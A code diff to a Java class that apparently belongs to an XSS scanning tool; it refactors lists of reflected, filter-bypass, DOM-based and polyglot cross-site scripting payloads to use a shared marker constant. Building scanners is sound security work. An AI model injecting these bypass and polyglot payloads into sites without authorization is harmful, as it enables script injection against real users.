@@ -6,43 +6,43 @@ import java.util.stream.Collectors;
 
 public class PayloadManager {
 
+    // Unique marker — short and distinctive
+    public static final String MARKER = "xsssentinel";
+
     // Basic reflected XSS payloads
     private static final List<String> BASIC_PAYLOADS = Arrays.asList(
-            "<script>alert('XSS-Sentinel')</script>",
-            "<img src=x onerror=alert('XSS-Sentinel')>",
-            "<svg onload=alert('XSS-Sentinel')>",
-            "\"><script>alert('XSS-Sentinel')</script>",
-            "'><script>alert('XSS-Sentinel')</script>",
-            "<body onload=alert('XSS-Sentinel')>",
-            "<iframe src=javascript:alert('XSS-Sentinel')>"
+            "<script>alert('" + MARKER + "')</script>",
+            "<img src=x onerror=alert('" + MARKER + "')>",
+            "<svg onload=alert('" + MARKER + "')>",
+            "\"><script>alert('" + MARKER + "')</script>",
+            "'><script>alert('" + MARKER + "')</script>",
+            "<body onload=alert('" + MARKER + "')>",
+            "<details open ontoggle=alert('" + MARKER + "')>"
     );
 
     // Filter bypass payloads
     private static final List<String> BYPASS_PAYLOADS = Arrays.asList(
-            "<ScRiPt>alert('XSS-Sentinel')</ScRiPt>",
-            "<img src=x onerror=alert`XSS-Sentinel`>",
-            "<svg/onload=alert('XSS-Sentinel')>",
-            "<input autofocus onfocus=alert('XSS-Sentinel')>",
-            "<select autofocus onfocus=alert('XSS-Sentinel')>",
-            "<video><source onerror=alert('XSS-Sentinel')>",
-            "<details open ontoggle=alert('XSS-Sentinel')>",
-            "<iframe src=javascript:alert('XSS-Sentinel')>"
+            "<ScRiPt>alert('" + MARKER + "')</ScRiPt>",
+            "<img src=x onerror=alert`" + MARKER + "`>",
+            "<svg/onload=alert('" + MARKER + "')>",
+            "<input autofocus onfocus=alert('" + MARKER + "')>",
+            "<select autofocus onfocus=alert('" + MARKER + "')>",
+            "<video><source onerror=alert('" + MARKER + "')>",
+            "<iframe src=javascript:alert('" + MARKER + "')>"
     );
 
     // DOM-based XSS payloads
     private static final List<String> DOM_PAYLOADS = Arrays.asList(
-            "javascript:alert('XSS-Sentinel')",
-            "#<img src=x onerror=alert('XSS-Sentinel')>",
-            "'-alert('XSS-Sentinel')-'",
-            "\"-alert('XSS-Sentinel')-\"",
-            "\\'-alert('XSS-Sentinel');//"
+            "#<img src=x onerror=alert('" + MARKER + "')>",
+            "'-alert('" + MARKER + "')-'",
+            "\"-alert('" + MARKER + "')-\""
     );
 
     // Polyglot payloads
     private static final List<String> POLYGLOT_PAYLOADS = Arrays.asList(
-            "'\"-->></styles></script><svg onload=alert('XSS-Sentinel')>",
-            "<script>/*'/*`/*\"/*</script><svg onload=alert('XSS-Sentinel')/*>",
-            "\">'><svg onload=alert('XSS-Sentinel')>"
+            "'\"-->></styles></script><svg onload=alert('" + MARKER + "')>",
+            "<script>/*'/*`/*\"/*</script><svg onload=alert('" + MARKER + "')/*>",
+            "\">'><svg onload=alert('" + MARKER + "')>"
     );
 
     // User custom payloads
